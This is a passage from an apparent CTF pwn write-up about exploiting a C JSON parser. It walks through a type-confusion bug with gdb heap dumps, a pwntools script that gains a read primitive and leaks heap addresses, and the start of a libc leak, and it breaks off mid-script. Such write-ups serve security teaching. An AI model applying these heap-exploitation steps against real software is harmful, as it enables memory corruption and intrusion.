</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_OBJECT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object_t</span> <span class="o">*</span><span class="n">curr</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">curr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;{}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;{</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">: &#34;</span><span class="p">,</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">print_value</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">,</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;,</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Noticed that when the function try to parse the object, it assumes that the <code>key</code> is a string, so it directly access and print it. However, remember what we have discussed before, where the <code>parse_object</code> is actually allowing the user&rsquo;s input object&rsquo;s key not a <code>string</code> type. This means, with this type confusion bug, we might be able to gain some sensitive address leak later.</p>
<p>Next, let&rsquo;s talk about the <code>free_value</code> function, which is called in <code>main</code> at the end of the loop. Basically, for <code>T_ARRAY</code> and <code>T_OBJECT</code>, the function needs to do more. For example, the <code>T_ARRAY</code>will try to iterate each of its element stored until the <code>next</code> is null value.</p>
<p>Now that we have reviewed some of the important functions (and find some bugs), it&rsquo;s time for us to think on how we can leverage this bug further.</p>
<h2 id="solution">Solution</h2>
<p>To recap, we have two main bugs so far:</p>
<ul>
<li>The fact that object&rsquo;s key in here doesn&rsquo;t required to be a <code>string</code>, yet the <code>print_value</code> always parse the key as a <code>string</code>, this means we get type confusion bug, which might be able to be used to get some leak.</li>
<li>During constructing array, if the last char is not <code>]</code> not <code>,</code>, the array&rsquo;s <code>next</code> won&rsquo;t be cleared nor set, which mean the <code>next</code> value will still used just like the old value.</li>
</ul>
<h3 id="leaking-useful-values">Leaking useful values</h3>
<p>In general, we usually start by trying to leak some useful values with the bug. So in this case, we will try to use the first bug, which is a type confusion bug, to leak useful values. Let&rsquo;s start by making observation in the gdb, to check how the data processed on an object with a valid key. Let say that we send an input <code>{&quot;aaaa&quot;:65}</code>, and then set breakpoint at <code>print_value</code>, so that we can inspect the layout of the parsed object in memory (which located in the <code>rdi</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/30gx $rdi-0x10
</span></span><span class="line"><span class="cl">0x55555555c290: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2a0: 0x000055555555c2c0      0x0000000000000006
</span></span><span class="line"><span class="cl">0x55555555c2b0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2c0: 0x0000000000000000      0x000055555555c2e0
</span></span><span class="line"><span class="cl">0x55555555c2d0: 0x000055555555c320      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2e0: 0x000055555555c300      0x0000000000000004
</span></span><span class="line"><span class="cl">0x55555555c2f0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c300: 0x0000000061616161      0x0000000000000000
</span></span><span class="line"><span class="cl">0x55555555c310: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c320: 0x0000000000000041      0x0000000000000002
</span></span></code></pre></td></tr></table>
</div>
</div><p>First chunk is a <code>json_t</code> object, where the first 8 bytes point to the <code>object_t</code> chunk, and the last 8 bytes represent thae <code>json_t</code> type (which is <code>T_OBJECT</code>). Next, taking a look at the <code>object_t</code> chunk, we can see that the first 8 bytes are null, because we only have one pair of key-value. Next 8 bytes points to the <code>key</code> chunk, and last 8 bytes points to the <code>value</code> chunk. The <code>key</code> chunk is actually another <code>json_t</code> chunk, where now, it defined the <code>key</code> as a <code>T_STRING</code> type, and it points to another chunk, which is the string value itself.</p>
<p>Now that we know how the <code>key</code> stored in the memory, let&rsquo;s try to take a look again at the type confusion bug LOC.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">T_OBJECT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object_t</span> <span class="o">*</span><span class="n">curr</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">...</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">indent</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">: &#34;</span><span class="p">,</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s try to observe what happen if we set the <code>key</code> as a <code>number</code> data type. Let say that we input <code>{65:65}</code>, let&rsquo;s check how the object stored in the memory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/30gx $rdi-0x10
</span></span><span class="line"><span class="cl">0x55555555c290: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2a0: 0x000055555555c2c0      0x0000000000000006
</span></span><span class="line"><span class="cl">0x55555555c2b0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2c0: 0x0000000000000000      0x000055555555c2e0
</span></span><span class="line"><span class="cl">0x55555555c2d0: 0x000055555555c300      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2e0: 0x0000000000000041      0x0000000000000002
</span></span><span class="line"><span class="cl">0x55555555c2f0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c300: 0x0000000000000041      0x0000000000000002
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observed that the <code>key</code> chunk type here is <code>T_INT</code> instead of <code>T_STRING</code>, and if you continue the execution, <strong>it will crash</strong>.</p>
<p>The reason for this crash is because of the type confusion in the <code>print_value</code> function. The LOC <code>curr-&gt;key-&gt;string</code> will treat the <code>key</code> chunk as a <code>T_STRING</code> type, which is the expectation is that the first 8 bytes are pointer to the actual string. However, because our <code>key</code> type is actually <code>T_INT</code>, and it will store our value in the first 8 bytes instead of storing a pointer, the program will crash because it will try to dereference it.</p>
<p>This crash is a good thing for us, because this mean, if we set our <code>T_INT</code> value to a valid address, <code>print_value</code> will try to dereference our input value and print its content. With this bug, we have a <code>read</code> primitive. If we have a valid address and want to leak its content, we can simply send an <code>object</code> input with our targeted address as the <code>key</code>, and <code>print_value</code> will print its content.</p>
<h4 id="leaking-heap-address">Leaking heap address</h4>
<p>However, up until now, we don&rsquo;t have any leak yet, so how can we know a valid address value? The answer is, let&rsquo;s try to find other data type, which might give us a leak! Let&rsquo;s check through the available object type once again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Json</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">object_t</span> <span class="o">*</span><span class="n">object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">array_t</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">boolean</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">nint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">double</span> <span class="n">nfloat</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">type_t</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">json_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Array</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">array_t</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">json_t</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">array_t</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To abuse this type confusion bug, we need to use a data type which contains a pointer to another pointer, so that when we dereference it, the printed value is another pointer address. Looking at the above code, one good type that we can abuse here is <code>array_t</code>. The reason is because <code>array</code> will point to the next array&rsquo;s element, which mean the printed value will be a <code>heap</code> address. Let&rsquo;s start making our script, so that we can interact with the binary easier. Below is the initial helper that I defined on the script.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;json_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;chal-kalmarc.tf&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">menu_delim</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logbase</span><span class="p">():</span> <span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc.address = </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logleak</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>  <span class="n">info</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s1">&#39; = </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">so</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sn</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="n">sla</span><span class="p">(</span><span class="n">menu_delim</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="n">menu_delim</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that our helper is ready, to give a better understanding, let&rsquo;s try to send <code>{[0,0]:0}</code> to the binary.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Heap leak</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;{[0,0]:0}&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above script will send <code>{[0,0]:0}</code> input. Before running the above script, as usual, set a breakpoint at the <code>print_value</code>, and inspect its object layout once again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/50gx $rdi-0x10
</span></span><span class="line"><span class="cl">0x55555555c290: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2a0: 0x000055555555c2c0      0x0000000000000006
</span></span><span class="line"><span class="cl">0x55555555c2b0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2c0: 0x0000000000000000      0x000055555555c2e0
</span></span><span class="line"><span class="cl">0x55555555c2d0: 0x000055555555c380      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c2e0: 0x000055555555c300      0x0000000000000005
</span></span><span class="line"><span class="cl">0x55555555c2f0: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c300: 0x000055555555c340      0x000055555555c320
</span></span><span class="line"><span class="cl">0x55555555c310: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c320: 0x0000000000000000      0x0000000000000002
</span></span><span class="line"><span class="cl">0x55555555c330: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c340: 0x0000000000000000      0x000055555555c360
</span></span><span class="line"><span class="cl">0x55555555c350: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c360: 0x0000000000000000      0x0000000000000002
</span></span><span class="line"><span class="cl">0x55555555c370: 0x0000000000000000      0x0000000000000021
</span></span><span class="line"><span class="cl">0x55555555c380: 0x0000000000000000      0x0000000000000002
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>key</code> object is now an <code>Array</code> data type, and when the <code>print_value</code> try to print the <code>key</code>, it will print the <code>array_t-&gt;next</code> pointer, which is a <strong>heap</strong> address. With this, we finally get a leak of known valid address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_heap&#39;</span><span class="p">,</span> <span class="n">leaked_heap</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above script will retrieve the printed <code>key</code> value and store it in our script. Now, we can move to the next step, which is trying to leak <code>libc</code> values.</p>
<h4 id="leaking-libc-address">Leaking libc address</h4>
<p>Now that we know a heap address, we need to find a way to get another useful leak values, which is <code>libc</code> address. As usual, the most common way to put a <code>libc</code> address to the <code>heap</code> area is by having an <code>unsorted bin</code> in the <code>heap</code> area. There are many ways to trigger unsorted bin, either you create a string large enough and free it, or you fulfill the <code>tcache</code> bins. For this challenge, I decided to use the second approach, which is to fulfill the <code>tcache</code> bins. Let&rsquo;s try to extend our script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Trigger unsorted bin</span>
</span></span><span class="line"><span class="cl"><span class="n">a_str</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x80</span>
